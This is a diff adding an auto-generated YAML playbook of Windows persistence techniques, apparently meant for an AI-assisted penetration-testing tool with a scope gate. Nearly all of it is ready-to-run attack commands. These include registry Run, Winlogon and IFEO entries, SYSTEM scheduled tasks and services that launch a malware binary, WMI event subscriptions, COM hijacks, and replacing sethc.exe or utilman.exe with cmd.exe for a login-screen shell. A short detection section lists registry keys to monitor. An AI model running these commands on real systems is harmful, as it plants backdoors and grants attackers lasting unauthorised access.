@@ -1,0 +1,383 @@
+# GENERATED from persistence_techniques.md by scripts/playbooks_to_yaml.py — do not hand-edit.
+#
+# The markdown stays authoritative: it is what a human reads and what RAG
+# ingests. This is an EXTRACT of the steps in it, so that something other
+# than a language model can act on them. Re-generate after editing the
+# markdown; tests/test_playbooks.py fails if the two drift.
+#
+# access_required is a conservative heuristic, recorded so a consumer can
+# FILTER — never so anything can decide to run. Authorisation stays with
+# the scope gate and the engagement's approval.
+name: persistence_techniques
+title: Persistence Techniques
+source: persistence_techniques.md
+generated_by: scripts/playbooks_to_yaml.py
+phases:
+- id: registry-based-persistence
+  name: Registry-Based Persistence
+  steps:
+  - id: registry-based-persistence.run-keys
+    title: Run Keys
+    access_required: shell
+    mutates: true
+    source_line: 12
+    commands:
+    - lang: cmd
+      command: '# Current user'
+    - lang: cmd
+      command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\malware.exe"
+    - lang: cmd
+      command: '# All users (requires admin)'
+    - lang: cmd
+      command: reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\malware.exe"
+    - lang: cmd
+      command: '# RunOnce (single execution)'
+    - lang: cmd
+      command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ
+        /d "C:\malware.exe"
+  - id: registry-based-persistence.winlogon-keys
+    title: Winlogon Keys
+    access_required: shell
+    mutates: true
+    source_line: 26
+    commands:
+    - lang: cmd
+      command: '# Userinit - runs after user profile is loaded'
+    - lang: cmd
+      command: reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Userinit /t REG_SZ
+        /d "C:\Windows\System32\userinit.exe,C:\malware.exe"
+    - lang: cmd
+      command: '# Shell - replace explorer'
+    - lang: cmd
+      command: reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon" /v Shell /t REG_SZ
+        /d "explorer.exe,C:\malware.exe"
+  - id: registry-based-persistence.image-file-execution-options-ifeo
+    title: Image File Execution Options (IFEO)
+    access_required: shell
+    mutates: true
+    source_line: 37
+    commands:
+    - lang: cmd
+      command: '# When notepad.exe runs, execute malware instead'
+    - lang: cmd
+      command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe"
+        /v Debugger /t REG_SZ /d "C:\malware.exe"
+  - id: registry-based-persistence.appinit-dlls
+    title: AppInit_DLLs
+    access_required: shell
+    mutates: true
+    source_line: 45
+    commands:
+    - lang: cmd
+      command: reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t
+        REG_SZ /d "C:\malware.dll"
+    - lang: cmd
+      command: reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs
+        /t REG_DWORD /d 1
+- id: scheduled-tasks
+  name: Scheduled Tasks
+  steps:
+  - id: scheduled-tasks.create-persistent-task
+    title: Create Persistent Task
+    access_required: none
+    mutates: true
+    source_line: 57
+    commands:
+    - lang: cmd
+      command: '# At logon'
+    - lang: cmd
+      command: schtasks /create /tn "Updater" /tr "C:\malware.exe" /sc onlogon /ru SYSTEM
+    - lang: cmd
+      command: '# At startup'
+    - lang: cmd
+      command: schtasks /create /tn "Updater" /tr "C:\malware.exe" /sc onstart /ru SYSTEM
+    - lang: cmd
+      command: '# Every 5 minutes'
+    - lang: cmd
+      command: schtasks /create /tn "Updater" /tr "C:\malware.exe" /sc minute /mo 5
+    - lang: cmd
+      command: '# At specific time daily'
+    - lang: cmd
+      command: schtasks /create /tn "Updater" /tr "C:\malware.exe" /sc daily /st 09:00
+  - id: scheduled-tasks.powershell-method
+    title: PowerShell Method
+    access_required: none
+    mutates: true
+    source_line: 72
+    commands:
+    - lang: powershell
+      command: $Action = New-ScheduledTaskAction -Execute "C:\malware.exe"
+    - lang: powershell
+      command: $Trigger = New-ScheduledTaskTrigger -AtLogOn
+    - lang: powershell
+      command: $Principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel
+        Highest
+    - lang: powershell
+      command: Register-ScheduledTask -TaskName "Updater" -Action $Action -Trigger $Trigger -Principal
+        $Principal
+  - id: scheduled-tasks.hidden-task-com-handler
+    title: Hidden Task (COM Handler)
+    access_required: none
+    mutates: false
+    source_line: 80
+    commands:
+    - lang: powershell
+      command: $Action = New-ScheduledTaskAction -Execute "C:\Windows\System32\rundll32.exe" -Argument
+        "-sta {CLSID}"
+- id: services
+  name: Services
+  steps:
+  - id: services.create-malicious-service
+    title: Create Malicious Service
+    access_required: none
+    mutates: true
+    source_line: 90
+    commands:
+    - lang: cmd
+      command: '# Create service'
+    - lang: cmd
+      command: sc create Backdoor binpath= "C:\malware.exe" start= auto
+    - lang: cmd
+      command: '# Start service'
+    - lang: cmd
+      command: sc start Backdoor
+    - lang: cmd
+      command: '# Query service'
+    - lang: cmd
+      command: sc query Backdoor
+  - id: services.powershell-method
+    title: PowerShell Method
+    access_required: none
+    mutates: true
+    source_line: 102
+    commands:
+    - lang: powershell
+      command: New-Service -Name "Backdoor" -BinaryPathName "C:\malware.exe" -DisplayName "System Service"
+        -StartupType Automatic
+    - lang: powershell
+      command: Start-Service Backdoor
+  - id: services.service-dll-persistence
+    title: Service DLL Persistence
+    access_required: shell
+    mutates: true
+    source_line: 108
+    commands:
+    - lang: cmd
+      command: '# Create service that loads DLL'
+    - lang: cmd
+      command: sc create Backdoor binpath= "C:\Windows\System32\svchost.exe -k netsvcs" type= share start=
+        auto
+    - lang: cmd
+      command: '# Add DLL to service group'
+    - lang: cmd
+      command: reg add "HKLM\SYSTEM\CurrentControlSet\Services\Backdoor\Parameters" /v ServiceDll /t REG_EXPAND_SZ
+        /d "C:\malware.dll"
+- id: startup-folder
+  name: Startup Folder
+  steps:
+  - id: startup-folder.lnk-shortcut
+    title: LNK Shortcut
+    access_required: none
+    mutates: false
+    source_line: 129
+    commands:
+    - lang: powershell
+      command: $WshShell = New-Object -ComObject WScript.Shell
+    - lang: powershell
+      command: $Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Updater.lnk")
+    - lang: powershell
+      command: $Shortcut.TargetPath = "C:\malware.exe"
+    - lang: powershell
+      command: $Shortcut.Save()
+- id: dll-hijacking
+  name: DLL Hijacking
+  steps:
+  - id: dll-hijacking.dll-search-order-hijacking
+    title: DLL Search Order Hijacking
+    access_required: none
+    mutates: false
+    source_line: 141
+    commands:
+    - lang: unknown
+      command: 1. Application directory
+    - lang: unknown
+      command: 2. System directory (C:\Windows\System32)
+    - lang: unknown
+      command: 3. 16-bit system directory
+    - lang: unknown
+      command: 4. Windows directory
+    - lang: unknown
+      command: 5. Current directory
+    - lang: unknown
+      command: 6. PATH directories
+  - id: dll-hijacking.phantom-dll-loading
+    title: Phantom DLL Loading
+    access_required: none
+    mutates: false
+    source_line: 153
+  - id: dll-hijacking.dll-proxying
+    title: DLL Proxying
+    access_required: none
+    mutates: false
+    source_line: 166
+- id: wmi-persistence
+  name: WMI Persistence
+  steps:
+  - id: wmi-persistence.wmi-event-subscription
+    title: WMI Event Subscription
+    access_required: shell
+    mutates: true
+    source_line: 189
+    commands:
+    - lang: powershell
+      command: $Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments
+        @{ Name = "PersistenceFilter" EventNamespace = "root\cimv2" QueryLanguage = "WQL" Query = "SELECT
+        * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'
+        AND TargetInstance.SystemUpTime >= 200 AND TargetInstance.SystemUpTime < 320" }
+    - lang: powershell
+      command: $Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer
+        -Arguments @{ Name = "PersistenceConsumer" CommandLineTemplate = "C:\malware.exe" }
+    - lang: powershell
+      command: Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments
+        @{ Filter = $Filter Consumer = $Consumer }
+  - id: wmi-persistence.remove-wmi-persistence
+    title: Remove WMI Persistence
+    access_required: shell
+    mutates: true
+    source_line: 212
+    commands:
+    - lang: powershell
+      command: Get-WmiObject -Namespace root\subscription -Class __EventFilter | Where-Object { $_.Name
+        -eq "PersistenceFilter" } | Remove-WmiObject
+    - lang: powershell
+      command: Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer | Where-Object
+        { $_.Name -eq "PersistenceConsumer" } | Remove-WmiObject
+    - lang: powershell
+      command: Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object
+        { $_.Filter -like "*PersistenceFilter*" } | Remove-WmiObject
+- id: com-hijacking
+  name: COM Hijacking
+  steps:
+  - id: com-hijacking.registry-clsid-hijacking
+    title: Registry CLSID Hijacking
+    access_required: none
+    mutates: true
+    source_line: 223
+    commands:
+    - lang: cmd
+      command: '# Find COM object loaded by target application'
+    - lang: cmd
+      command: '# Hijack by creating HKCU entry (takes precedence over HKLM)'
+    - lang: cmd
+      command: reg add "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32" /ve /t REG_SZ /d "C:\malware.dll"
+    - lang: cmd
+      command: reg add "HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32" /v ThreadingModel /t REG_SZ
+        /d "Both"
+  - id: com-hijacking.common-hijackable-clsids
+    title: Common Hijackable CLSIDs
+    access_required: none
+    mutates: false
+    source_line: 232
+    commands:
+    - lang: unknown
+      command: '{b5f8350b-0548-48b1-a6ee-88bd00b4a5e2} - Explorer'
+    - lang: unknown
+      command: '{BCDE0395-E52F-467C-8E3D-C4579291692E} - MMDeviceEnumerator'
+- id: accessibility-features
+  name: Accessibility Features
+  steps:
+  - id: accessibility-features.sticky-keys-sethc
+    title: Sticky Keys (SETHC)
+    access_required: none
+    mutates: false
+    source_line: 242
+    commands:
+    - lang: cmd
+      command: '# Replace sethc.exe with cmd.exe'
+    - lang: cmd
+      command: takeown /f C:\Windows\System32\sethc.exe
+    - lang: cmd
+      command: icacls C:\Windows\System32\sethc.exe /grant administrators:F
+    - lang: cmd
+      command: copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+    - lang: cmd
+      command: '# Trigger: Press Shift 5 times at login screen'
+  - id: accessibility-features.utilman
+    title: Utilman
+    access_required: none
+    mutates: false
+    source_line: 252
+    commands:
+    - lang: cmd
+      command: '# Replace utilman.exe (Ease of Access)'
+    - lang: cmd
+      command: takeown /f C:\Windows\System32\utilman.exe
+    - lang: cmd
+      command: icacls C:\Windows\System32\utilman.exe /grant administrators:F
+    - lang: cmd
+      command: copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+    - lang: cmd
+      command: '# Trigger: Win+U at login screen'
+  - id: accessibility-features.registry-method-ifeo
+    title: Registry Method (IFEO)
+    access_required: none
+    mutates: true
+    source_line: 262
+    commands:
+    - lang: cmd
+      command: reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe"
+        /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"
+- id: application-shimming
+  name: Application Shimming
+  steps:
+  - id: application-shimming.create-shim-database
+    title: Create Shim Database
+    access_required: none
+    mutates: false
+    source_line: 292
+    commands:
+    - lang: powershell
+      command: sdbinst malware.sdb
+- id: office-add-ins
+  name: Office Add-ins
+  steps:
+  - id: office-add-ins.word-startup-folder
+    title: Word STARTUP Folder
+    access_required: none
+    mutates: false
+    source_line: 317
+    commands:
+    - lang: cmd
+      command: copy malware.dll "%APPDATA%\Microsoft\Word\STARTUP\"
+  - id: office-add-ins.excel-xll-add-in
+    title: Excel XLL Add-in
+    access_required: none
+    mutates: true
+    source_line: 322
+    commands:
+    - lang: cmd
+      command: reg add "HKCU\Software\Microsoft\Office\16.0\Excel\Options" /v OPEN /t REG_SZ /d "/A \"C:\malware.xll\""
+- id: detection-hunting
+  name: Detection & Hunting
+  steps:
+  - id: detection-hunting.registry-locations-to-monitor
+    title: Registry Locations to Monitor
+    access_required: none
+    mutates: false
+    source_line: 343
+    commands:
+    - lang: unknown
+      command: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    - lang: unknown
+      command: HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+    - lang: unknown
+      command: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+    - lang: unknown
+      command: HKLM\SYSTEM\CurrentControlSet\Services
+    - lang: unknown
+      command: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
+  - id: detection-hunting.tools-for-detection
+    title: Tools for Detection
+    access_required: none
+    mutates: false
+    source_line: 352
